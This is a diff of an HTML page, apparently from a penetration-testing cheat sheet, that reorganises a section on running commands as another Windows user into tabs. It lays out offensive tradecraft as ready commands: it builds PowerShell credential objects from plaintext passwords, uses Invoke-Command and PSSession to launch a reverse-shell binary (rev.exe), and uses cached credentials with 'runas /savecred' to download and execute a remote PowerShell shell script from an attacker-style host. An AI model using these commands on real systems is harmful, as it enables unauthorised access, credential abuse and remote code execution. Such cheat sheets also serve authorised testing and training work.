@@ -195,33 +195,59 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="runas-with-cred-object">Runas (with cred object)</h3>
-<h4 id="create-cred-object-method-1">Create cred object (Method #1)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;&lt;DOMAIN&gt;\&lt;USER&gt;&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="s2">&#34;&lt;PASSWORD&gt;&#34;</span>
+<h3 id="create-credential-object">Create credential object</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Method #1</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >Method #2</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$secstr</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">SecureString</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span><span class="p">.</span><span class="py">ToCharArray</span><span class="p">()</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span><span class="nv">$secstr</span><span class="p">.</span><span class="py">AppendChar</span><span class="p">(</span><span class="nv">$_</span><span class="p">)}</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">-typename</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span> <span class="n">-argumentlist</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$secstr</span>
-</span></span></code></pre></div><h4 id="create-cred-object-method-2">Create cred object (Method #2)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;&lt;PASSWORD&gt;&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="s2">&#34;&lt;DOMAIN&gt;\&lt;USER&gt;&#34;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
-</span></span></code></pre></div><h4 id="run-commnad">Run Commnad</h4>
+</span></span></code></pre></div></div>
+</div></p>
+<h3 id="runas-with-cred-object">Runas (with cred object)</h3>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Invoke-Command</button>
+
+<button data-tabset="set2" data-tabcontent="tab2" >PSSession</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Computer</span> <span class="n">localhost</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># If error, try</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Computer</span> <span class="n">localhost</span> <span class="n">-auth</span> <span class="n">credssp</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Invoke command with config</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span> <span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Computer</span> <span class="n">localhost</span> <span class="n">-ConfigurationName</span> <span class="n">config_name</span>
-</span></span></code></pre></div><h4 id="create-a-new-ps-session">Create a new PS session</h4>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">new-pssession</span> <span class="n">-computername</span> <span class="p">.</span> <span class="n">-credential</span> <span class="nv">$cred</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Switch to new session</span>
 </span></span><span class="line"><span class="cl"><span class="nb">enter-pssession</span> <span class="mf">1</span>
-</span></span></code></pre></div><h3 id="runas-with-cache-creds">Runas (with cache creds)</h3>
+</span></span></code></pre></div></div>
+</div></p>
+<h3 id="runas-with-cache-creds">Runas (with cache creds)</h3>
 <h4 id="check-cache-creds">Check cache creds</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
-</span></span></code></pre></div><h4 id="run-command">Run Command</h4>
+</span></span></code></pre></div></div>
+<h4 id="run-command">Run Command</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># e.g. Upload and run a shell</span>
 </span></span><span class="line"><span class="cl"><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;\&lt;</span><span class="n">USER</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">savecred</span> <span class="s2">&#34;powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.10/shell.ps1&#39;)&#34;</span>
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
 </div></div>
     
     <script src="/js/utils.js"></script>
